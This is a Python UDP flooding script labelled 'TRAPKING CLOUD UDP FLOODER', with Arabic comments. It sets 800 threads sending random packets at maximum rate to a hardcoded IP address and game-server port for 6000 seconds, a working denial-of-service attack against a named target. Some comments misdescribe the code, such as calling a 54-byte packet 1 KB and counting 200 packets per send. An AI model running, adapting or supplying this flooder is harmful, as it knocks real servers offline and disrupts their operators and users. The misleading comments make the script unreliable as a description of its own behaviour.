import socket
import random
import threading
import time

# =====================================================================
# === TRAPKING CLOUD UDP FLOODER (VPS Optimized Edition) ===
# =====================================================================

# ضع هنا الـ IP المستهدف للبورت الخاص بسيرفر الـ SA-MP
TARGET_IP = "89.46.1.130" 
TARGET_PORT = 7008          # البورت الافتراضي لـ SA-MP (أو البورت الخاص بالهدف)
DURATION = 6000               # مدة الضغط بالثواني
THREADS_COUNT = 800         # عدد الخيوط المتعددة لاستغلال معالج Ryzen 9 بالكامل

# توليد حزم بيانات عشوائية وكبيرة نسبياً لإشغال ممر الشبكة
# سيرفرات SA-MP تستجيب لطلبات معينة أو حزم عشوائية مكثفة
packet_data = random._urandom(54) # حزمة بحجم 1 كيلوبايت لكل إرسال

def stress_target():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + DURATION
    
    sent_packets = 0
    while time.time() < end_time:
        try:
            # إرسال حزم الـ UDP المتتالية بأقصى سرعة ممكنة
            client.sendto(packet_data, (TARGET_IP, TARGET_PORT))
            sent_packets += 200
        except Exception as e:
            # في حال حدث أي ضغط على السوكت، نكمل الإرسال بدون توقف
            pass
            
    client.close()

def main():
    print(f"[*] جاري بدء عملية الضغط على السيرفر المستهدف: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] استخدام {THREADS_COUNT} خيط (Threads) لاستغلال قوة المعالج السحابي...")
    
    threads = []
    
    # تشغيل الخيوط بالتوازي
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=stress_target)
        threads.append(t)
        t.start()
        
    # الانتظار حتى تنتهي المدة المحددة
    for t in threads:
        t.join()
        
    print("\n[+] انتهت عملية الضغط الميداني.")

if __name__ == "__main__":
    main()
